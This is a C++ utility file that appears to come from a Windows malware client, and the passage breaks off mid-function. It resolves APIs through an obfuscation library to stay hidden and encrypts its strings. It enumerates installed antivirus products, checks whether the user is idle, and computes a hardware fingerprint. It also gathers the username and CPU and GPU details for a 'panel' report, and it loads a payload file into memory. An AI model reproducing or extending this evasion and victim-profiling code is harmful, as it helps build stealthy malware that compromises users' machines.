#include "../include/util.h"
#include "../include/process_info.h"
#include "../include/encryption.h"
#include <iostream>
#include <intrin.h>
#include <sys/types.h>
#include <signal.h>
#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <chrono>
#include <unordered_map>
#include <algorithm>
#include <chrono>
#include <wbemidl.h>
#include <comdef.h>

// Include Obfusk8 for stealth API calling
#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"

typedef BOOL(WINAPI* pGetLastInputInfo_t)(PLASTINPUTINFO);
typedef HANDLE(WINAPI* pCreateMutexA_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pProcess32NextW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pCloseHandle_t)(HANDLE);
typedef BOOL(WINAPI* pGetUserNameA_util_t)(LPSTR, LPDWORD);
typedef BOOL(WINAPI* pOpenProcessToken_t)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI* pGetTokenInformation_t)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef LONG(WINAPI* pRegOpenKeyExA_util_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* pRegCloseKey_util_t)(HKEY);
typedef LONG(WINAPI* pRegEnumKeyExA_t)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG(WINAPI* pRegOpenKeyExW_t)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* pRegEnumKeyExW_t)(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
typedef LONG(WINAPI* pRegQueryValueExW_t)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef BOOL(WINAPI* pCreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI* pWaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL(WINAPI* pGetExitCodeProcess_t)(HANDLE, LPDWORD);

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// --- Encoding helpers -------------------------------------------------------
namespace {

// Decodes a single UTF-8 sequence starting at index `i`.
// Returns the sequence length (1-4), or 0 when the bytes are not a valid
// UTF-8 sequence (bad lead byte, truncated sequence, overlong form, surrogate
// or out-of-range code point).
size_t DecodeUtf8Sequence(const std::string& str, size_t i, unsigned int& codepoint) {
    static const unsigned int kMinCodepoint[5] = { 0, 0, 0x80, 0x800, 0x10000 };

    const unsigned char c = static_cast<unsigned char>(str[i]);
    size_t length;
    unsigned int cp;

    if (c < 0x80)                 { length = 1; cp = c; }
    else if ((c & 0xE0) == 0xC0)  { length = 2; cp = c & 0x1Fu; }
    else if ((c & 0xF0) == 0xE0)  { length = 3; cp = c & 0x0Fu; }
    else if ((c & 0xF8) == 0xF0)  { length = 4; cp = c & 0x07u; }
    else                          { return 0; }

    if (i + length > str.size()) return 0;

    for (size_t k = 1; k < length; ++k) {
        const unsigned char cc = static_cast<unsigned char>(str[i + k]);
        if ((cc & 0xC0) != 0x80) return 0;
        cp = (cp << 6) | (cc & 0x3Fu);
    }

    if (cp < kMinCodepoint[length] || cp > 0x10FFFF || (cp >= 0xD800 && cp <= 0xDFFF))
        return 0;

    codepoint = cp;
    return length;
}

} // namespace

std::wstring Utf8ToWide(const std::string& str) {
    if (str.empty()) return std::wstring();

    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), NULL, 0);
    if (sizeNeeded <= 0) return std::wstring();

    std::wstring result(static_cast<size_t>(sizeNeeded), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), &result[0], sizeNeeded);
    return result;
}

std::string WideToUTF8(const wchar_t* wstr, int len) {
    if (wstr == NULL) return std::string();

    if (len < 0) {
        len = static_cast<int>(wcslen(wstr));
    }
    if (len <= 0) return std::string();

    // WideCharToMultiByte with UTF-8 replaces unpaired surrogates, so the output
    // is always a valid UTF-8 sequence.
    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr, len, NULL, 0, NULL, NULL);
    if (sizeNeeded <= 0) return std::string();

    std::string result(static_cast<size_t>(sizeNeeded), '\0');
    WideCharToMultiByte(CP_UTF8, 0, wstr, len, &result[0], sizeNeeded, NULL, NULL);
    return result;
}

std::string WideToUTF8(const std::wstring& wstr) {
    return WideToUTF8(wstr.c_str(), static_cast<int>(wstr.size()));
}

std::string AnsiToUTF8(const char* str, int len) {
    if (str == NULL) return std::string();

    if (len < 0) {
        len = static_cast<int>(strlen(str));
    }
    if (len <= 0) return std::string();

    // Interprets the bytes using the system ANSI code page and re-encodes them
    // as UTF-8, so accented/non-Latin text survives instead of being mangled.
    int wideLen = MultiByteToWideChar(CP_ACP, 0, str, len, NULL, 0);
    if (wideLen <= 0) return std::string();

    std::wstring wide(static_cast<size_t>(wideLen), L'\0');
    MultiByteToWideChar(CP_ACP, 0, str, len, &wide[0], wideLen);
    return WideToUTF8(wide);
}

bool IsValidUTF8(const std::string& str) {
    size_t i = 0;
    while (i < str.size()) {
        unsigned int codepoint = 0;
        const size_t length = DecodeUtf8Sequence(str, i, codepoint);
        if (length == 0) return false;
        i += length;
    }
    return true;
}

std::string EnsureValidUTF8(const std::string& str) {
    // Fast path: already well formed, nothing to do.
    if (IsValidUTF8(str)) return str;

    // Last line of defence before the value reaches nlohmann::json, which throws
    // type_error.316 on invalid UTF-8 and would abort the whole report. Every
    // offending byte is replaced with U+FFFD (REPLACEMENT CHARACTER).
    static const char kReplacement[] = "\xEF\xBF\xBD";

    std::string result;
    result.reserve(str.size());

    size_t i = 0;
    while (i < str.size()) {
        unsigned int codepoint = 0;
        const size_t length = DecodeUtf8Sequence(str, i, codepoint);
        if (length == 0) {
            result += kReplacement;
            ++i;
            continue;
        }
        result.append(str, i, length);
        i += length;
    }
    return result;
}

std::string TrimWhitespace(const std::string& str) {
    const char* kWhitespace = " \t\r\n\v\f";

    size_t start = str.find_first_not_of(kWhitespace);
    if (start == std::string::npos) return std::string();

    size_t end = str.find_last_not_of(kWhitespace);
    return str.substr(start, end - start + 1);
}


BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
{
    HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if(file == INVALID_HANDLE_VALUE) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "Could not open file!" << std::endl;
#endif
        return nullptr;
    }
    HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
    if (!mapping) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "Could not create mapping!" << std::endl;
#endif
        CloseHandle(file);
        return nullptr;
    }
    BYTE *dllRawData = (BYTE*) MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (dllRawData == nullptr) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "Could not map view of file" << std::endl;
#endif
        CloseHandle(mapping);
        CloseHandle(file);
        return nullptr;
    }
    r_size = GetFileSize(file, 0);
    BYTE* localCopyAddress = allocate_buffer(r_size);
    if (localCopyAddress == NULL) {
        std::cerr << "Could not allocate memory in the current process" << std::endl;
        // Release the view and both handles, otherwise every failed load leaked
        // the mapping and the file handle.
        UnmapViewOfFile(dllRawData);
        CloseHandle(mapping);
        CloseHandle(file);
        return nullptr;
    }
    memcpy(localCopyAddress, dllRawData, r_size);
    UnmapViewOfFile(dllRawData);
    CloseHandle(mapping);
    CloseHandle(file);
    return localCopyAddress;
}

BYTE* allocate_buffer(size_t size)
{
    if (size == 0) return nullptr;
    return (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

void free_buffer(BYTE* buffer)
{
    if (buffer == NULL) return;
    if (!VirtualFree(buffer, 0, MEM_RELEASE)) {
        // Reaching this means the buffer did not come from allocate_buffer()/
        // VirtualAlloc() and was therefore never released.
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] free_buffer: VirtualFree failed (error " << GetLastError()
                  << "), buffer was not allocated with allocate_buffer()" << std::endl;
#endif
    }
}

wchar_t* get_file_name(wchar_t *full_path)
{
    size_t len = wcslen(full_path);
    for (size_t i = len - 2; i >= 0; i--) {
        if (full_path[i] == '\\' || full_path[i] == '/') {
            return full_path + (i + 1);
        }
    }
    return full_path;
}


std::string GetWindowsUsername() {
    typedef BOOL(WINAPI* pGetUserNameW_util_t)(LPWSTR, LPDWORD);
    pGetUserNameW_util_t _GetUserNameW = (pGetUserNameW_util_t)STEALTH_API_OBFSTR("advapi32.dll", "GetUserNameW");

    const DWORD MAX_USERNAME_LENGTH = 256;
    std::string result;
    DWORD size = MAX_USERNAME_LENGTH;

    // Prefer the Unicode API: GetUserNameA() converts to the ANSI code page, so
    // an accented user name became invalid UTF-8 and broke the JSON report.
    if (_GetUserNameW) {
        wchar_t usernameW[MAX_USERNAME_LENGTH] = { 0 };
        if (_GetUserNameW(usernameW, &size) && size > 1) {
            result = WideToUTF8(usernameW, static_cast<int>(size - 1));
        }
    }

    if (result.empty()) {
        pGetUserNameA_util_t _GetUserNameA = (pGetUserNameA_util_t)STEALTH_API_OBFSTR("advapi32.dll", "GetUserNameA");
        char usernameA[MAX_USERNAME_LENGTH] = { 0 };
        size = MAX_USERNAME_LENGTH;

        if (!_GetUserNameA || !_GetUserNameA(usernameA, &size) || size <= 1) {
            return OBFUSCATE_STRING("guest");
        }
        result = AnsiToUTF8(usernameA, static_cast<int>(size - 1));
    }

    std::replace(result.begin(), result.end(), ' ', '-');
    return EnsureValidUTF8(result);
}

int GetSystemUptimeMinutes() {
    #ifdef _WIN32
    ULONGLONG uptimeMs = GetTickCount64();
    #else
    // For Linux/Unix: use system uptime via /proc/uptime or clock_gettime
    auto now = std::chrono::steady_clock::now();
    auto duration = now.time_since_epoch();
    ULONGLONG uptimeMs = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
    #endif
    int uptimeMinutes = (int)(uptimeMs / (1000 * 60));
    return uptimeMinutes;
}

wchar_t* get_directory(IN wchar_t *full_path, OUT wchar_t *out_buf, IN const size_t out_buf_size)
{
    memset(out_buf, 0, out_buf_size);
    memcpy(out_buf, full_path, out_buf_size);

    wchar_t *name_ptr = get_file_name(out_buf);
    if (name_ptr != nullptr) {
        *name_ptr = '\0'; //cut it
    }
    return out_buf;
}


bool IsPidRunning(DWORD pid) {
    // Use ProcessAPI for stealth process queries
    ProcessAPI procAPI;
    if (!procAPI.IsInitialized()) {
        // Fallback to direct API if initialization fails
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hProcess == NULL) {
            return false;
        }
        DWORD exitCode;
        if (GetExitCodeProcess(hProcess, &exitCode)) {
            CloseHandle(hProcess);
            return (exitCode == STILL_ACTIVE);
        }
        CloseHandle(hProcess);
        return false;
    }

    // Use direct API for GetExitCodeProcess (not available in ProcessAPI class)
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        return false;
    }

    DWORD exitCode;
    if (GetExitCodeProcess(hProcess, &exitCode)) {
        CloseHandle(hProcess);
        return (exitCode == STILL_ACTIVE);
    }

    CloseHandle(hProcess);
    return false;
}


bool AreProcessesRunning(const std::vector<std::string>& processNames) {
    pCreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateToolhelp32Snapshot");
    pProcess32FirstW_t _Process32FirstW = (pProcess32FirstW_t)STEALTH_API_OBFSTR("kernel32.dll", "Process32FirstW");
    pProcess32NextW_t _Process32NextW = (pProcess32NextW_t)STEALTH_API_OBFSTR("kernel32.dll", "Process32NextW");
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || !_CloseHandle)
        return false;

    HANDLE hProcessSnap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return false;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!_Process32FirstW(hProcessSnap, &pe32)) {
        _CloseHandle(hProcessSnap);
        return false;
    }

    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;

    do {
        std::string currentProcess = converter.to_bytes(pe32.szExeFile);
        std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), ::tolower);

        for (const auto& targetProcess : processNames) {
            std::string targetLower = targetProcess;
            std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::tolower);
            if (currentProcess.find(targetLower) != std::string::npos) {
                _CloseHandle(hProcessSnap);
                return true;
            }
        }
    } while (_Process32NextW(hProcessSnap, &pe32));

    _CloseHandle(hProcessSnap);
    return false;
}


// Convert std::string to LPWSTR
LPWSTR StringToLPWSTR(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    wchar_t* wstr = new wchar_t[size_needed + 1];
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), wstr, size_needed);
    wstr[size_needed] = 0;
    return wstr;
}

std::string buildCommandFromTemplate(
    const std::string& template_str,
    const std::unordered_map<std::string, std::string>& replacements
) {
    std::string result = template_str;
    
    for (const auto& [placeholder, value] : replacements) {
        size_t pos = result.find(placeholder);
        if (pos != std::string::npos) {
            result.replace(pos, placeholder.length(), value);
        }
    }
    
    return result;
}

bool IsDeviceIdle(int minutes) {
    pGetLastInputInfo_t _GetLastInputInfo = (pGetLastInputInfo_t)STEALTH_API_OBFSTR("user32.dll", "GetLastInputInfo");
    pCloseHandle_t _GetTickCount = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTickCount");
    typedef DWORD(WINAPI* pGetTickCount_t)();
    pGetTickCount_t _Tick = (pGetTickCount_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTickCount");

    LASTINPUTINFO lastInputInfo;
    lastInputInfo.cbSize = sizeof(LASTINPUTINFO);

    if (!_GetLastInputInfo || !_GetLastInputInfo(&lastInputInfo))
        return false;

    DWORD currentTickCount = _Tick ? _Tick() : GetTickCount();
    DWORD idleTimeMs = currentTickCount - lastInputInfo.dwTime;
    auto thresholdMs = std::chrono::minutes(minutes).count() * 60 * 1000;
    bool isIdle = (idleTimeMs >= thresholdMs);

    return isIdle;
}



bool IsAnotherInstanceRunning(const char* mutexName) {
    pCreateMutexA_t _CreateMutexA = (pCreateMutexA_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateMutexA");
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
    if (!_CreateMutexA) return true;

    HANDLE hMutex = _CreateMutexA(NULL, TRUE, mutexName);
    if (hMutex == NULL) return true;

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (_CloseHandle) _CloseHandle(hMutex);
        return true;
    }
    return false;
}

std::string GetCPUName() {
    const std::string keyPathA = OBFUSCATE_STRING("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
    const std::string valueNameA = OBFUSCATE_STRING("ProcessorNameString");
    const std::wstring keyPathW = Utf8ToWide(keyPathA);
    const std::wstring valueNameW = Utf8ToWide(valueNameA);

    // Preferred path: read the REG_SZ as UTF-16 and convert to UTF-8 directly.
    // The A variants would map the string through the ANSI code page instead.
    pRegOpenKeyExW_t _RegOpenKeyExW = (pRegOpenKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExW");
    pRegQueryValueExW_t _RegQueryValueExW = (pRegQueryValueExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegQueryValueExW");
    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");

    if (_RegOpenKeyExW && _RegQueryValueExW && _RegCloseKey) {
        HKEY hKey = NULL;
        if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPathW.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t cpuNameW[256] = { 0 };
            DWORD size = sizeof(cpuNameW);
            LONG result = _RegQueryValueExW(hKey, valueNameW.c_str(), NULL, NULL, (LPBYTE)cpuNameW, &size);
            _RegCloseKey(hKey);

            if (result == ERROR_SUCCESS) {
                std::string cpuName = TrimWhitespace(WideToUTF8(cpuNameW));
                if (!cpuName.empty()) {
                    return EnsureValidUTF8(cpuName);
                }
            }
        }
    }

    // Fallback: ANSI registry access through the stealth RegistryAPI. The bytes
    // are decoded with the ANSI code page and re-encoded as UTF-8 so they stay
    // usable for the panel payload.
    RegistryAPI regAPI;
    if (regAPI.IsInitialized()) {
        HKEY hKey = NULL;
        if (regAPI.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPathA.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            return OBFUSCATE_STRING("Unknown");
        }

        char cpuNameA[256] = { 0 };
        DWORD size = sizeof(cpuNameA);
        LONG result = regAPI.pRegQueryValueExA(hKey, valueNameA.c_str(), NULL, NULL, (LPBYTE)cpuNameA, &size);
        regAPI.pRegCloseKey(hKey);

        if (result == ERROR_SUCCESS) {
            std::string cpuName = TrimWhitespace(AnsiToUTF8(cpuNameA));
            if (!cpuName.empty()) {
                return EnsureValidUTF8(cpuName);
            }
        }
        return OBFUSCATE_STRING("Unknown");
    }

    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPathA.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return OBFUSCATE_STRING("Unknown");
    }

    char cpuNameA[256] = { 0 };
    DWORD size = sizeof(cpuNameA);
    LONG result = RegQueryValueExA(hKey, valueNameA.c_str(), NULL, NULL, (LPBYTE)cpuNameA, &size);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        std::string cpuName = TrimWhitespace(AnsiToUTF8(cpuNameA));
        if (!cpuName.empty()) {
            return EnsureValidUTF8(cpuName);
        }
    }
    return OBFUSCATE_STRING("Unknown");
}

std::string GetGPUName() {
    // Try WMI first for better detection
    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        // Fall back to registry if WMI initialization fails
        goto registry_fallback;
    }

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
                               RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        goto registry_fallback;
    }

    {
        IWbemLocator *pLoc = NULL;
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                               IID_IWbemLocator, (LPVOID *)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            goto registry_fallback;
        }

        IWbemServices *pSvc = NULL;
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        IEnumWbemClassObject *pEnumerator = NULL;
        hres = pSvc->ExecQuery(_bstr_t(L"WQL"), _bstr_t(L"SELECT Name FROM Win32_VideoController"),
                              WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        IWbemClassObject *pclsObj = NULL;
        ULONG uReturn = 0;
        std::string gpuName = "Unknown";
        
        while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK && uReturn > 0) {
            VARIANT vtProp;
            VariantInit(&vtProp);
            
            HRESULT hresGet = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hresGet) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
                // The BSTR is UTF-16. Convert it straight to UTF-8: wcstombs_s used
                // the ANSI code page (mangling non-ASCII names) and the old
                // "new char[wcslen + 1]" buffer was too small for multi-byte output.
                std::string candidate = TrimWhitespace(WideToUTF8(vtProp.bstrVal));

                if (!candidate.empty() && candidate != "Unknown") {
                    gpuName = candidate;
                    VariantClear(&vtProp);
                    pclsObj->Release();
                    break;
                }
            }
            
            VariantClear(&vtProp);
            pclsObj->Release();
        }
        
        if (gpuName != "Unknown") {
            pEnumerator->Release();
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return EnsureValidUTF8(gpuName);
        }

        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }

registry_fallback:
    {
    pRegOpenKeyExW_t _RegOpenKeyExW = (pRegOpenKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExW");
    pRegEnumKeyExW_t _RegEnumKeyExW = (pRegEnumKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegEnumKeyExW");
    pRegQueryValueExW_t _RegQueryValueExW = (pRegQueryValueExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegQueryValueExW");
    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");
    if (!_RegOpenKeyExW || !_RegEnumKeyExW || !_RegQueryValueExW || !_RegCloseKey)
        return OBFUSCATE_STRING("Unknown");

    HKEY hKey = NULL;
    LONG result = _RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey);

    if (result != ERROR_SUCCESS)
        return OBFUSCATE_STRING("Unknown");

    std::string gpuName = OBFUSCATE_STRING("Unknown");
    DWORD index = 0;
    wchar_t subkeyName[256] = {0};
    DWORD subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);

    while (_RegEnumKeyExW(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        HKEY hSubKey = NULL;
        if (_RegOpenKeyExW(hKey, subkeyName, 0, KEY_QUERY_VALUE, &hSubKey) == ERROR_SUCCESS) {
            wchar_t providerName[512] = {0};
            DWORD size = sizeof(providerName);
            if (_RegQueryValueExW(hSubKey, L"ProviderName", NULL, NULL, (LPBYTE)providerName, &size) == ERROR_SUCCESS) {
                if (wcsstr(providerName, L"NVIDIA") != NULL ||
                    wcsstr(providerName, L"AMD") != NULL ||
                    wcsstr(providerName, L"ATI") != NULL ||
                    wcsstr(providerName, L"Advanced Micro Devices") != NULL ||
                    wcsstr(providerName, L"Intel") != NULL) {
                    wchar_t deviceDesc[512] = {0};
                    DWORD descSize = sizeof(deviceDesc);
                    if (_RegQueryValueExW(hSubKey, L"DeviceDesc", NULL, NULL, (LPBYTE)deviceDesc, &descSize) == ERROR_SUCCESS) {
                        wchar_t* deviceName = deviceDesc;
                        wchar_t* semicolon = wcschr(deviceDesc, L';');
                        if (semicolon != NULL) deviceName = semicolon + 1;
                        // Stay in Unicode all the way to UTF-8 (no ANSI detour).
                        gpuName = TrimWhitespace(WideToUTF8(deviceName));
                        _RegCloseKey(hSubKey);
                        _RegCloseKey(hKey);
                        return EnsureValidUTF8(gpuName);
                    }
                }
            }
            _RegCloseKey(hSubKey);
        }
        index++;
        subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
    }
    _RegCloseKey(hKey);
    return EnsureValidUTF8(gpuName);
    }
}

std::string GetComputerHash() {
    // 1. Collect CPUID leaf 1: processor signature + feature flags
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);

    // Mask out EBX bits 31-24 (Initial APIC ID) — varies by which core runs CPUID
    char cpuidStr[36];
    snprintf(cpuidStr, sizeof(cpuidStr), "%08X%08X%08X%08X",
        (unsigned int)cpuInfo[0], (unsigned int)(cpuInfo[1] & 0x00FFFFFF),
        (unsigned int)cpuInfo[2], (unsigned int)cpuInfo[3]);

    // 2. Collect motherboard serial number via WMI (Win32_BaseBoard.SerialNumber)
    std::string mbSerial = "0";

    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    // S_OK / S_FALSE: we own a ref; RPC_E_CHANGED_MODE: COM already init'd on thread
    bool ownedCOMInit = (hres == S_OK || hres == S_FALSE);

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    if (SUCCEEDED(hres)) {
        IWbemServices* pSvc = NULL;
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (SUCCEEDED(hres)) {
            CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

            IEnumWbemClassObject* pEnum = NULL;
            hres = pSvc->ExecQuery(_bstr_t(L"WQL"),
                _bstr_t(L"SELECT SerialNumber FROM Win32_BaseBoard"),
                WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
            if (SUCCEEDED(hres)) {
                IWbemClassObject* pObj = NULL;
                ULONG uReturn = 0;
                if (pEnum->Next(WBEM_INFINITE, 1, &pObj, &uReturn) == S_OK && uReturn > 0) {
                    VARIANT vtProp;
                    VariantInit(&vtProp);
                    if (SUCCEEDED(pObj->Get(L"SerialNumber", 0, &vtProp, 0, 0)) &&
                        vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
                        mbSerial = EnsureValidUTF8(WideToUTF8(vtProp.bstrVal));
                        if (mbSerial.empty()) mbSerial = "0";
                    }
                    VariantClear(&vtProp);
                    pObj->Release();
                }
                pEnum->Release();
            }
            pSvc->Release();
        }
        pLoc->Release();
    }
    if (ownedCOMInit) CoUninitialize();

    // 3. Combine CPUID string + motherboard serial, then FNV-1a 64-bit hash
    std::string combined = std::string(cpuidStr) + "|" + mbSerial;

    unsigned long long hash = 14695981039346656037ULL;
    for (unsigned char c : combined) {
        hash ^= (unsigned long long)c;
        hash *= 1099511628211ULL;
    }

    char result[17];
    snprintf(result, sizeof(result), "%016llX", hash);
    return std::string(result);
}

std::string GetAntivirusName() {
    // Enumerate the Uninstall key with the Unicode APIs: RegEnumKeyExA() maps
    // subkey names through the ANSI code page, which fails or mangles them on
    // non-English systems.
    pRegOpenKeyExW_t _RegOpenKeyExW = (pRegOpenKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExW");
    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");
    pRegEnumKeyExW_t _RegEnumKeyExW = (pRegEnumKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegEnumKeyExW");
    if (!_RegOpenKeyExW || !_RegCloseKey || !_RegEnumKeyExW)
        return OBFUSCATE_STRING("Unknown");

    HKEY hKey = NULL;
    const std::wstring defenderKey = Utf8ToWide(OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows Defender"));
    if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, defenderKey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        _RegCloseKey(hKey);
        return OBFUSCATE_STRING("Windows Defender");
    }

    const std::wstring uninstallKey = Utf8ToWide(OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"));
    if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, uninstallKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return OBFUSCATE_STRING("Unknown");

    const wchar_t* antivirusNames[] = {
        L"Norton", L"McAfee", L"Kaspersky", L"AVG", L"Avast",
        L"Bitdefender", L"F-Secure", L"ESET", L"Trend Micro", L"Symantec"
    };

    DWORD index = 0;
    wchar_t subkeyName[256] = { 0 };
    DWORD subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);

    while (_RegEnumKeyExW(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        for (const wchar_t* av : antivirusNames) {
            if (wcsstr(subkeyName, av) != nullptr) {
                _RegCloseKey(hKey);
                return EnsureValidUTF8(WideToUTF8(av));
            }
        }
        index++;
